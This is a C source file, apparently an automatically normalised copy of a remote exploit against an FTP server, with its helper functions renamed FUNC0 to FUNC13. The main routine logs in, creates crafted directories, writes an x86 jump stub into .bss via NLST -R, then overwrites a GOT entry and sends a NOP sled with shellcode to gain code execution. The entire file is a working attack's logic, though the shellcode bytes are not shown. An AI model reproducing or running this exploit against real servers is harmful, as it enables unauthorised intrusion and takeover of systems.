#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  sc ;

/* Variables and functions */
 int BSS ; 
 int GOT ; 
 int MAXPATH ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int*,int*,int,char**) ; 
 int FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 char* FUNC8 (int,char*,char*,...) ; 
 char* shellcode ; 
 int FUNC9 (int,char*) ; 
 int /*<<< orphan*/ * FUNC10 (char*,char*) ; 
 char* FUNC11 (char*,char*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 

int FUNC13 (int argc, char **argv)
{
	int s[2], c, port = 21, pasv[5];
	unsigned int i;
	char *host = NULL, *user = "anonymous", *pass = "", *tmp, *p;
	char mkd[5][MAXPATH], sc[2048];
	int 
		got = GOT,
		jmpaddr[] = { BSS, BSS+4, BSS+8 },
		jmpc[] = {
			0x1234ba66, // mov dx, 0x1234   - 66 ba 34 12
			0xc2396658, // pop eax          - 58
			0xe4fffa75  // cmp ax,dx        - 66 39 c2
                        // jne $-4          - 75 fa
                        // jmp esp          - ff e4
		};

	while ((c = FUNC4(argc, argv, "h:p:u:P:?")) != -1)
	{
		switch (c)
		{
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = FUNC0(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 'P':
				pass = optarg;
				break;
			case '?':
			default:
				FUNC12(argv[0]);
				break;
		}
	}
	if (host == NULL)
		FUNC12(argv[0]);

	FUNC7("[+] GOT: %p - .bss (jmpcode): %p\n", (void *)got, (void *)jmpaddr[0]);
	FUNC3(jmpaddr, jmpc, got, mkd);

	FUNC7("[+] %s:%d (user: %s pass: %s)\n", host, port, user, pass);
	s[0] = FUNC9(port, host);
	FUNC8(s[0], "331", "USER %s\n", user);
	p = FUNC8(s[0], NULL, "PASS %s\n", pass);
	if (FUNC10(p, "230") == NULL)
	{
		FUNC7("[!] login failed\n");
		FUNC2(1);
	}
	p = FUNC8(s[0], NULL, "MKD %s\nMKD %s\nMKD %s\n", mkd[0], mkd[1], mkd[2]);
	if (FUNC10(p, "257") == NULL)
	{
		FUNC7("[!] couldn't make directories\n");
		FUNC2(1);
	}

	FUNC7("[+] PASV\n");
	p = FUNC8(s[0], "227", "PASV\n");
	if (FUNC11(p, ",") == NULL)
		FUNC2(1);
	for (i = 0; i < 5; i++)
	{
		if ((tmp = FUNC11(NULL, ",")) == NULL)
		{
			FUNC7("[!] aborting\n");
			FUNC2(1);
		}
		pasv[i] = FUNC0(tmp);
	}
	s[1] = FUNC9(pasv[3]*256+pasv[4], host);

	FUNC7("[+] writing jumpcode\n");
	FUNC8(s[0], NULL, "NLST -R\n");
	FUNC8(s[0], NULL, "RMD %s\nRMD %s\nRMD %s\n", mkd[0], mkd[1], mkd[2]);
	FUNC1(s[1]);

	FUNC8(s[0], NULL, "MKD %s\n", mkd[3]);
	FUNC7("[+] PASV\n");
	p = FUNC8(s[0], "227", "PASV\n");
	if (FUNC11(p, ",") == NULL)
		FUNC2(1);
	for (i = 0; i < 5; i++)
	{
		if ((tmp = FUNC11(NULL, ",")) == NULL)
		{
			FUNC7("[!] aborting\n");
			FUNC2(1);
		}
		pasv[i] = FUNC0(tmp);
	}
	s[1] = FUNC9(pasv[3]*256+pasv[4], host);

	FUNC6(sc, 0x90, sizeof(sc)); // some nops before and
	FUNC5(sc+3, "\x34\x12", 2); // after the "mark"
	FUNC5(sc+12, shellcode, sizeof(sc)-12);
	FUNC7("[+] overwriting GOT entry and sending shellcode\n\n");
	FUNC8(s[0], NULL, "NLST -R%s\n", sc);
	return 0;
}